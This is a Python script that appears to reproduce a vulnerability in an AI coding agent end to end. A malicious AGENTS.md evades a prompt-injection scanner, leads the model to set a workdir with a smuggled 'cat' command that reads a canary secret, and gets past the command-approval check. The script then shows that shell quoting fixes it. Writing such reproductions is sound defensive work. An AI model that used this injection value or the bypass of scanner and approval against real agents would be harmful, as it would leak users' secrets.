#!/usr/bin/env python3
"""End-to-end reproduction of workdir command injection via malicious AGENTS.md.

This script simulates the full attack chain:
1. Malicious AGENTS.md bypasses prompt injection scanner
2. LLM follows AGENTS.md instructions and sets crafted workdir
3. Workdir is interpolated into shell command without quoting
4. Injected command executes and exfiltrates data

Run:
    python3 tests/e2e_workdir_injection/run_e2e.py
"""

import importlib.util
import os
import re
import shlex
import subprocess
import sys
import tempfile

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(os.path.dirname(SCRIPT_DIR))

# ── Colors ──────────────────────────────────────────────────────────────
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def load_scanner():
    """Load the prompt injection scanner from prompt_builder.py."""
    spec = importlib.util.spec_from_file_location(
        "prompt_builder",
        os.path.join(PROJECT_ROOT, "agent", "prompt_builder.py"),
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod._scan_context_content, mod._CONTEXT_THREAT_PATTERNS


def load_approval():
    """Load the dangerous command detector from approval.py."""
    spec = importlib.util.spec_from_file_location(
        "approval",
        os.path.join(PROJECT_ROOT, "tools", "approval.py"),
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.detect_dangerous_command


def main():
    print(f"\n{BOLD}{'=' * 70}")
    print(f"  END-TO-END WORKDIR INJECTION via MALICIOUS AGENTS.md")
    print(f"{'=' * 70}{RESET}\n")

    # ── Step 1: Create canary secret ────────────────────────────────────
    canary = tempfile.NamedTemporaryFile(
        mode="w", suffix=".txt", delete=False, prefix="hermes_canary_"
    )
    canary.write("LEAKED_API_KEY=sk-live-SUPER-SECRET-KEY-12345\n")
    canary.close()
    canary_path = canary.name

    print(f"  {CYAN}Step 1:{RESET} Created canary secret at {canary_path}")
    print(f"          Contains: LEAKED_API_KEY=sk-live-SUPER-SECRET-KEY-12345\n")

    # ── Step 2: Load and scan AGENTS.md ─────────────────────────────────
    agents_md_path = os.path.join(SCRIPT_DIR, "AGENTS.md")
    with open(agents_md_path) as f:
        agents_content = f.read()

    # Replace the hardcoded canary path with our temp file
    agents_content_live = agents_content.replace(
        "/tmp/hermes_canary.txt", canary_path
    )

    print(f"  {CYAN}Step 2:{RESET} Scanning AGENTS.md through prompt injection scanner...")

    scan_context, patterns = load_scanner()
    result = scan_context(agents_content_live, "AGENTS.md")

    if "[BLOCKED" in result:
        print(f"          {RED}BLOCKED — scanner caught it: {result}{RESET}")
        print(f"          The AGENTS.md needs to be revised to bypass the scanner.")
        os.unlink(canary_path)
        return 1
    else:
        print(f"          {GREEN}PASSED — scanner found no threats{RESET}")
        print(f"          The malicious AGENTS.md was loaded into the system prompt.\n")

    # Show which patterns it evaded
    print(f"          Scanner patterns evaded:")
    for pattern, pid in patterns:
        match = re.search(pattern, agents_content_live, re.IGNORECASE)
        status = f"{RED}MATCHED{RESET}" if match else f"{GREEN}evaded{RESET}"
        print(f"            [{status}] {pid}: /{pattern[:50]}{'...' if len(pattern) > 50 else ''}/")
    print()

    # ── Step 3: Simulate LLM tool call ──────────────────────────────────
    # The LLM reads AGENTS.md and follows the "workspace convention"
    malicious_workdir = f"~/; cat {canary_path} 2>/dev/null; cd ~"
    innocent_command = "ls -la"

    print(f"  {CYAN}Step 3:{RESET} LLM reads AGENTS.md and makes a tool call:")
    print(f"          terminal(command=\"{innocent_command}\", workdir=\"{malicious_workdir}\")\n")

    # ── Step 4: Check approval system ───────────────────────────────────
    detect_dangerous = load_approval()

    print(f"  {CYAN}Step 4:{RESET} Approval system checks the command...")
    is_dangerous, _, desc = detect_dangerous(innocent_command)
    print(f"          detect_dangerous_command(\"{innocent_command}\")")
    print(f"          → Dangerous? {is_dangerous}")
    if not is_dangerous:
        print(f"          → {GREEN}APPROVED — command looks safe{RESET}")
    else:
        print(f"          → {RED}BLOCKED — {desc}{RESET}")

    # Check if workdir would be caught IF it were checked
    is_dangerous_wd, _, desc_wd = detect_dangerous(malicious_workdir)
    print(f"\n          detect_dangerous_command(\"{malicious_workdir[:50]}...\")")
    print(f"          → Dangerous? {is_dangerous_wd} ({desc_wd})")
    print(f"          → {YELLOW}But workdir is NEVER passed to the approval system!{RESET}\n")

    # ── Step 5: Simulate environment execution ──────────────────────────
    print(f"  {CYAN}Step 5:{RESET} Simulating shell command construction in each environment...\n")

    environments = {
        "SSH (ssh.py)": {
            "vulnerable": f"cd {malicious_workdir} && {innocent_command}",
            "fixed": f"cd {shlex.quote(malicious_workdir)} && {innocent_command}",
        },
        "Docker tilde (docker.py)": {
            "vulnerable": f"cd {malicious_workdir} && {innocent_command}",
            "fixed": f"cd {shlex.quote(malicious_workdir)} && {innocent_command}",
        },
        "Singularity tilde (singularity.py)": {
            "vulnerable": f"cd {malicious_workdir} && {innocent_command}",
            "fixed": f"cd {shlex.quote(malicious_workdir)} && {innocent_command}",
        },
    }

    vuln_leaked = 0
    fixed_leaked = 0

    for env_name, cmds in environments.items():
        print(f"    {BOLD}── {env_name} ──{RESET}")

        # Vulnerable version
        shell_cmd = cmds["vulnerable"]
        print(f"    VULNERABLE shell: {shell_cmd[:80]}...")
        proc = subprocess.run(
            ["bash", "-c", shell_cmd],
            capture_output=True, text=True, timeout=5,
        )
        leaked = "LEAKED_API_KEY" in proc.stdout or "sk-live-SUPER-SECRET" in proc.stdout
        if leaked:
            vuln_leaked += 1
            # Show the leaked content
            for line in proc.stdout.strip().split("\n"):
                if "LEAKED" in line or "sk-live" in line:
                    print(f"    {RED}OUTPUT: {line}{RESET}")
            print(f"    {RED}↑ SECRET LEAKED via command injection{RESET}")
        else:
            print(f"    {GREEN}No leak{RESET}")

        # Fixed version
        shell_cmd_fixed = cmds["fixed"]
        print(f"    FIXED shell:      {shell_cmd_fixed[:80]}...")
        proc_fixed = subprocess.run(
            ["bash", "-c", shell_cmd_fixed],
            capture_output=True, text=True, timeout=5,
        )
        leaked_fixed = "LEAKED_API_KEY" in proc_fixed.stdout or "sk-live-SUPER-SECRET" in proc_fixed.stdout
        if leaked_fixed:
            fixed_leaked += 1
            print(f"    {RED}STILL LEAKED after fix!{RESET}")
        else:
            print(f"    {GREEN}BLOCKED — shlex.quote() prevents injection{RESET}")
        print()

    # ── Step 6: Full attack narrative ───────────────────────────────────
    print(f"  {CYAN}Step 6:{RESET} Attack chain summary\n")
    print(f"    1. Attacker places malicious AGENTS.md in a project repo")
    print(f"    2. User opens the project with hermes-agent (Docker/SSH backend)")
    print(f"    3. AGENTS.md is loaded into system prompt (bypasses scanner)")
    print(f"    4. LLM follows the 'workspace convention' and sets crafted workdir")
    print(f"    5. User approves 'ls -la' — looks innocent")
    print(f"    6. workdir is interpolated into shell: cd <payload> && ls -la")
    print(f"    7. Payload executes: secret file contents appear in output")
    print(f"    8. LLM sees the secret in output (even if redacted to user,")
    print(f"       the LLM already has it in context)")
    print()

    # ── Cleanup ─────────────────────────────────────────────────────────
    os.unlink(canary_path)

    # ── Summary ─────────────────────────────────────────────────────────
    print(f"{BOLD}{'=' * 70}")
    print(f"  RESULTS")
    print(f"{'=' * 70}{RESET}")
    print(f"  Scanner bypass:     {GREEN}YES — AGENTS.md loaded successfully{RESET}")
    print(f"  Approval bypass:    {GREEN if not is_dangerous else RED}YES — 'ls -la' approved{RESET}")
    print(f"  Vulnerable leaked:  {RED}{vuln_leaked}/3 environments{RESET}")
    print(f"  Fixed leaked:       {GREEN if fixed_leaked == 0 else RED}{fixed_leaked}/3 environments{RESET}")
    print()

    if vuln_leaked > 0 and fixed_leaked == 0:
        print(f"  {GREEN}The shlex.quote() fix in ssh.py, docker.py, and singularity.py")
        print(f"  successfully blocks this attack chain.{RESET}")
    print()

    return 0


if __name__ == "__main__":
    sys.exit(main())
